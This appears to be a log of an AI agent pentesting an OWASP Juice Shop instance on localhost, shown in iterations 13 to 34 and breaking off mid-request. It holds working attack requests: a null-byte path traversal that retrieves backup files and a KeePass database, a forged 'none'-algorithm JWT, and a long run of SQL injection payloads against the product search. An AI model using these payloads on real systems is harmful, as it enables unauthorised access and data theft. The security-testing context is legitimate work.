+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp/package-lock.json.bak%2500.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:47:22 GMT\",\"etag\":\"W/\\\"b7311-19d8abea090\\\"\",\"content-type\":\"application/octet-stream\",\"content-length\":\"750353\",\"date\":\"Fri, 23 Oct 2026 00:51:28 GMT\",\"",
+      "timestamp": "2026-10-23T00:51:28.511Z"
+    },
+    {
+      "iteration": 13,
+      "thought": "Informações valiosas: versão 6.2.0-SNAPSHOT, dependências antigas como express-jwt 0.1.3 (vulnerável a algoritmo none), sanitize-html 1.4.2, sequelize ~4, libxmljs ~0.18 (XXE), socket.io ~2.0. Vou testar a API admin, version e configuração, além de testar o endpoint `/rest/admin/application-configuration` para informações sensíveis.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/admin/application-configuration",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/admin/application-configuration\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"21770\",\"etag\":\"W/\\\"550a-OEo3agZPnY9Z7Todze3/X9Rt2J8\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:30 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n",
+      "timestamp": "2026-10-23T00:51:30.427Z"
+    },
+    {
+      "iteration": 14,
+      "thought": "Configuração completa exposta publicamente. Vou obter a versão da aplicação e depois verificar `/rest/admin/application-version`. Também vou testar o endpoint `/api/Feedbacks/` e outras rotas admin. Vou guardar este achado para reportar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/admin/application-version",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/admin/application-version\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"20\",\"etag\":\"W/\\\"14-tCKnqyl1elU2Vzkywa8P9qRtJx4\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:34 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"version\"",
+      "timestamp": "2026-10-23T00:51:34.073Z"
+    },
+    {
+      "iteration": 15,
+      "thought": "Versão 19.2.1 do Juice Shop. Vou reportar os findings iniciais de Information Disclosure (config e versão admin sem auth, stack trace, source map) e Path Traversal. Depois vou testar JWT algoritmo none e outras categorias.",
+      "action": {
+        "action": "report_finding",
+        "title": "Path Traversal / Null Byte Bypass in /ftp File Server",
+        "severity": "HIGH",
+        "category": "Path Traversal / LFI",
+        "description": "CWE-22 Path Traversal. O endpoint /ftp aplica validação de extensão que pode ser bypassada com null byte (%00). Foi possível ler arquivos .bak (package.json.bak, package-lock.json.bak, coupons_2013.md.bak) e baixar o banco de senhas KeePass incident-support.kdbx. Impacto: exposição de informações sensíveis, dependências, possíveis credenciais.",
+        "steps": [
+          "Acessar http://localhost:3000/ftp e observar listagem de arquivos sensíveis",
+          "Tentar http://localhost:3000/ftp/package.json.bak → 403 'Only .md and .pdf files are allowed!'",
+          "Fazer http://localhost:3000/ftp/package.json.bak%2500.md → 200 com conteúdo do arquivo",
+          "Repetir para coupons_2013.md.bak, package-lock.json.bak e incident-support.kdbx"
+        ],
+        "evidence": "HTTP 200 com body de package.json.bak, package-lock.json.bak e incident-support.kdbx após null-byte bypass; stack trace vazou path /juice-shop/build/routes/fileServer.js"
+      },
+      "observation": "Finding registrado com sucesso.\nTítulo: \"Path Traversal / Null Byte Bypass in /ftp File Server\" | Severidade: HIGH\nTotal de findings até agora: 1.",
+      "timestamp": "2026-10-23T00:51:37.854Z"
+    },
+    {
+      "iteration": 16,
+      "thought": "Vou reportar também a exposição administrativa de configuração/versão e stack trace, e então seguir para testar JWT algoritmo none devido ao express-jwt 0.1.3 vulnerável.",
+      "action": {
+        "action": "report_finding",
+        "title": "Sensitive Information Disclosure via Unauthenticated Admin Endpoints and Verbose Errors",
+        "severity": "MEDIUM",
+        "category": "Sensitive Data Exposure",
+        "description": "CWE-200 Information Exposure. Os endpoints /rest/admin/application-version e /rest/admin/application-configuration retornam informações sem autenticação (versão 19.2.1 e configuração completa do servidor). Além disso, erros 403 em /ftp retornam stack trace completo com paths internos (/juice-shop/build/routes/fileServer.js) e versões de bibliotecas (express).",
+        "steps": [
+          "GET /rest/admin/application-version → 200 {'version':'19.2.1'}",
+          "GET /rest/admin/application-configuration → 200 com configuração completa",
+          "GET /ftp/package.json.bak → 500/403 com stack trace"
+        ],
+        "evidence": "Respostas 200 dos endpoints admin sem token; stack trace com path /juice-shop/build/routes/fileServer.js"
+      },
+      "observation": "Finding registrado com sucesso.\nTítulo: \"Sensitive Information Disclosure via Unauthenticated Admin Endpoints and Verbose Errors\" | Severidade: MEDIUM\nTotal de findings até agora: 2.",
+      "timestamp": "2026-10-23T00:51:41.106Z"
+    },
+    {
+      "iteration": 17,
+      "thought": "Agora vou testar falhas JWT. O AppMap já fornece um JWT RS256. Sabendo que express-jwt 0.1.3 é antigo, vou tentar algoritmo 'none' e RS256→HS256. Primeiro decodificar o JWT atual e depois forjar variantes.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/user/whoami?fields=email",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMDo0OTowMC44MTggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMDo0OTowMC44MTggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzE2NjQ1fQ.QaYNWWO6eWuXlyWee8ist9Q2iASvdLOD7MHVNmpjBr30SXtIGw0IeN4w08So4zTAIdIWVfUCLJAxHyYfqEjWdOMmgQVNlvpUN7-GhE6Awcry-vop0tzXe3Ahx9WCe-roEUPPvpGYTK5nFla4g1dum70oU8EuWkg6ecmQ7ALfc14"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/user/whoami?fields=email\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"11\",\"etag\":\"W/\\\"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:49 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"user\": {}\n",
+      "timestamp": "2026-10-23T00:51:49.102Z"
+    },
+    {
+      "iteration": 18,
+      "thought": "O token válido retornou usuário vazio — estranho, mas pode ser porque o endpoint público não usa o token. Vou testar com um endpoint que claramente requer auth, como /rest/basket/NaN ou /rest/order-history. Também vou testar o token 'none' nesses endpoints.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/order-history",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMDo0OTowMC44MTggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMDo0OTowMC44MTggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzE2NjQ1fQ."
+        }
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/order-history\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:53 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"1900\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Blocked illegal activity by ::ffff:172",
+      "timestamp": "2026-10-23T00:51:53.228Z"
+    },
+    {
+      "iteration": 19,
+      "thought": "O token 'none' foi bloqueado como atividade ilegal — possível WAF/detecção de ataque. Vou testar o token original em /rest/order-history para confirmar comportamento normal, e depois tentar outros bypasses JWT. Também vou explorar SQL injection no search.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/order-history",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMDo0OTowMC44MTggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMDo0OTowMC44MTggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzE2NjQ1fQ.QaYNWWO6eWuXlyWee8ist9Q2iASvdLOD7MHVNmpjBr30SXtIGw0IeN4w08So4zTAIdIWVfUCLJAxHyYfqEjWdOMmgQVNlvpUN7-GhE6Awcry-vop0tzXe3Ahx9WCe-roEUPPvpGYTK5nFla4g1dum70oU8EuWkg6ecmQ7ALfc14"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/order-history\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"30\",\"etag\":\"W/\\\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:57 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n",
+      "timestamp": "2026-10-23T00:51:57.320Z"
+    },
+    {
+      "iteration": 20,
+      "thought": "Token original funciona. O algoritmo 'none' foi bloqueado. Vou testar agora SQL Injection no endpoint de busca /rest/products/search?q=, que é clássico no Juice Shop.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple'",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%27\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:51:59 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"321\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"SQLITE_ERROR: near \\\"'%'\\\"",
+      "timestamp": "2026-10-23T00:51:59.204Z"
+    },
+    {
+      "iteration": 21,
+      "thought": "SQL Injection confirmada em SQLite. A query é visível no erro. Vou explorar union-based para extrair dados. Primeiro determinar número de colunas com ORDER BY.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%27%20ORDER%20BY%201--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%27%20ORDER%20BY%201--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:00 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"351\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"SQLITE_",
+      "timestamp": "2026-10-23T00:52:00.564Z"
+    },
+    {
+      "iteration": 22,
+      "thought": "O LIKE encapsula tudo, então preciso fechar ambos os ORs e o WHERE. Payload: `apple%' OR '1'='1' UNION SELECT ... --`. Vou tentar UNION SELECT com NULLs.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%27%29%29%20UNION%20SELECT%20null,null,null,null,null,null,null,null,null--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%27%29%29%20UNION%20SELECT%20null,null,null,null,null,null,null,null,null--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:02 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length",
+      "timestamp": "2026-10-23T00:52:02.174Z"
+    },
+    {
+      "iteration": 23,
+      "thought": "A requisição caiu no angular.js — provavelmente a URL codificada foi interpretada de forma estranha. Vou tentar sem codificar os parênteses, ou com espaços como +.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple')) UNION SELECT null,null,null,null,null,null,null,null,null--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%27))%20UNION%20SELECT%20null,null,null,null,null,null,null,null,null--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:03 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"8",
+      "timestamp": "2026-10-23T00:52:03.834Z"
+    },
+    {
+      "iteration": 24,
+      "thought": "O search.js está rejeitando caracteres especiais na URL. Vou tentar payload mais simples: fechar apenas a aspa e usar UNION. A query é `LIKE '%q%'`. Então payload: `apple' UNION SELECT null,null,... -- ` — preciso de um comentário que engula o `')` restante. Tentei `'))` mas foi bloqueado. Vou testar `apple' UNION SELECT null,null,null,null,null,null,null,null,null FROM sqlite_master--` com comentário `--`.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%27+UNION+SELECT+null,null,null,null,null,null,null,null,null+FROM+sqlite_master--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%27+UNION+SELECT+null,null,null,null,null,null,null,null,null+FROM+sqlite_master--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:05 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content",
+      "timestamp": "2026-10-23T00:52:05.985Z"
+    },
+    {
+      "iteration": 25,
+      "thought": "A query mostra que preciso fechar o OR e o AND. Payload: `apple%' UNION SELECT ... --` não, preciso de `'))`. Mas `))` foi bloqueado por regex. Vou tentar codificar os parênteses de forma diferente ou usar `OR` booleano em vez de UNION. Testar boolean-based blind.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%27+OR+%271%27%3D%271",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/products/search?q=apple%27+OR+%271%27%3D%271\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"30\",\"etag\":\"W/\\\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:09 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\n",
+      "timestamp": "2026-10-23T00:52:09.022Z"
+    },
+    {
+      "iteration": 26,
+      "thought": "Retornou vazio, então o OR booleano ainda está dentro do LIKE. Preciso de `') OR '1'='1') --`. Vou tentar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%27%29+OR+%271%27%3D%271%29+--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%27%29+OR+%271%27%3D%271%29+--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:10 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"347\"}\nBody:\n{\n  \"error\": {\n    \"message\": ",
+      "timestamp": "2026-10-23T00:52:10.367Z"
+    },
+    {
+      "iteration": 27,
+      "thought": "A query mostra que o `)` fecha o LIKE, mas o OR está fora. Preciso fechar também o `)` do WHERE. Tentei `') OR '1'='1) --` mas o segundo `)` veio antes do comentário. Na verdade, preciso de `'))) OR '1'='1' --`. Vou tentar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%27%29%29%29+OR+%271%27%3D%271%27+--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%27%29%29%29+OR+%271%27%3D%271%27+--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:12 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"351\"}\nBody:\n{\n  \"error\": {\n    \"mess",
+      "timestamp": "2026-10-23T00:52:12.170Z"
+    },
+    {
+      "iteration": 28,
+      "thought": "O segundo LIKE ainda tem muitos parênteses. Preciso pensar na estrutura: `WHERE ((name LIKE '%X%') OR description LIKE '%X%') AND deletedAt IS NULL)`. Para bypass, preciso: `apple' OR '1'='1' --` de forma que fique `name LIKE '%apple' OR '1'='1' --%'`. Mas o `--` comenta o resto. Isso dá erro? Não, na verdade dá `name LIKE '%apple' OR '1'='1' --%' OR description...`. O OR pode fazer com que o primeiro termo seja sempre verdadeiro se a string for `'1'='1'`. Mas o `LIKE '%apple'` sem fechar aspa dá erro. Preciso de `apple%' OR '1'='1' --`. Testar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27+--",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27+--\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:14 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"331\"}\nBody:\n{\n  \"error\": {\n    \"message\": ",
+      "timestamp": "2026-10-23T00:52:14.891Z"
+    },
+    {
+      "iteration": 29,
+      "thought": "Quase! O `--` não comentou o `'` porque em SQLite `--` precisa de espaço antes. A query tem `--%'` — o `'` está depois. Preciso adicionar espaço após `--`. Testar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27+--+a",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27+--+a\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:16 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"335\"}\nBody:\n{\n  \"error\": {\n    \"message\"",
+      "timestamp": "2026-10-23T00:52:16.600Z"
+    },
+    {
+      "iteration": 30,
+      "thought": "Em SQLite, `--` comenta até o fim da linha, mas a query ainda tem o `)` do OR original. O problema é que o `'` após `-- a%'` não é comentado. Preciso de um comentário que engula até o final. Usar `/*` em vez de `--`. Testar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27+/*",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27+/*\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:18 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"331\"}\nBody:\n{\n  \"error\": {\n    \"message\": ",
+      "timestamp": "2026-10-23T00:52:18.168Z"
+    },
+    {
+      "iteration": 31,
+      "thought": "O `/*` não está sendo tratado como comentário porque precisa fechar com `*/`. Mas na query, o `*/` apareceria no fim. A string fica `/*%' OR ... /*%') ...`. O primeiro `*/` fecha no `%'`? Não, `%` não é `*`. Vou tentar comentar tudo incluindo o final usando `/* ... */` — mas preciso que o conteúdo do comentário contenha os caracteres problemáticos. Payload: `apple%' OR '1'='1'/*`.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27/*a*/",
+        "headers": {}
+      },
+      "observation": "HTTP 500 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27/*a*/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:20 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"351\"}\nBody:\n{\n  \"error\": {\n    \"message\"",
+      "timestamp": "2026-10-23T00:52:20.213Z"
+    },
+    {
+      "iteration": 32,
+      "thought": "O comentário fecha antes do `%'`. Preciso que o `*/` esteja no final, após todos os caracteres. Mas o search adiciona `%'` no fim. Então preciso de `*/` depois disso, o que não é possível. Alternativa: usar `OR '1'='1' AND '1'='1` e deixar o `)` natural. A query ficaria: `((name LIKE '%apple%' OR '1'='1') OR description LIKE '%apple%' OR '1'='1') AND deletedAt...)`. Isso é sintaticamente válido! Testar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"631\",\"etag\":\"W/\\\"277-VI61hcskKuQTMFDPsY2Bw55rALs\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:22 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout",
+      "timestamp": "2026-10-23T00:52:22.021Z"
+    },
+    {
+      "iteration": 33,
+      "thought": "SQLi booleana funciona mas retornou só produtos com 'apple'. Para confirmar injeção, preciso de payload que retorne TODOS os produtos (OR true). Testar com condição sempre verdadeira que engula o segundo LIKE: `apple%' OR '1'='1' OR name LIKE '%`? Não. Vou tentar time-based.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+AND+%271%27%3D%272",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/products/search?q=apple%25%27+AND+%271%27%3D%272\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"30\",\"etag\":\"W/\\\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 00:52:23 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=",
+      "timestamp": "2026-10-23T00:52:23.667Z"
+    },
+    {
+      "iteration": 34,
+      "thought": "AND false retorna vazio, OR true retorna resultados. SQL Injection booleana confirmada. Vou tentar UNION SELECT para extrair dados. A query original é `SELECT * FROM Products WHERE ...`. Selecionar todas as colunas com UNION — preciso saber quantas. Produto parece ter ~9 colunas. Testar UNION com 9 NULLs sem comentário, usando OR true para englobar.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/rest/products/search?q=apple%25%27+OR+%271%27%3D%271%27+UNION+SELECT+null,null,null,null,null,null,null,null,null+FROM+sqlite_master+WHERE+%271%27%3D%272",
+        "headers": {}
+      },
